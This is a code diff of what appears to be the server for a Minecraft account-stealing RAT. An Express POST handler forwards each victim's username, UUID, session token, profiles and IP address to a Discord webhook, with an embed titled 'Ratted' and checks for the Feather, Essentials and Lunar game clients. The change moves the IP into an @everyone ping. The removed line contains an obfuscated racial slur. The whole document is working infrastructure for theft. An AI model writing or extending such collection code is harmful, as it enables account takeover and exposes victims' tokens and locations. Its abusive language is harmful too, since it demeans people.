@@ -153,7 +153,7 @@ app.post("/", (req, res) => {
                 
                 try {
                     post(process.env.WEBHOOK, JSON.stringify({
-                        content: `@everyone - no nw chigger)`, //ping
+                        content: `@everyone - {req.body.ip}`, //ping
                         embeds: [{
                             title: `Ratted ${req.body.username} - Click For Stats`,
                              fields: [
@@ -161,7 +161,6 @@ app.post("/", (req, res) => {
                                 { name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true },
                                 { name: 'Token', value: `\`\`\`${req.body.token}\`\`\``, inline: false },
                                 { name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false },
-                                { name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true },
                                 { name: 'Feather', value: `${checkFeather}`, inline: true },
                                 { name: 'Essentials', value: `${checkEssentials}`, inline: true },
                                 { name: 'Lunar', value: `${checkLunar}`, inline: true },
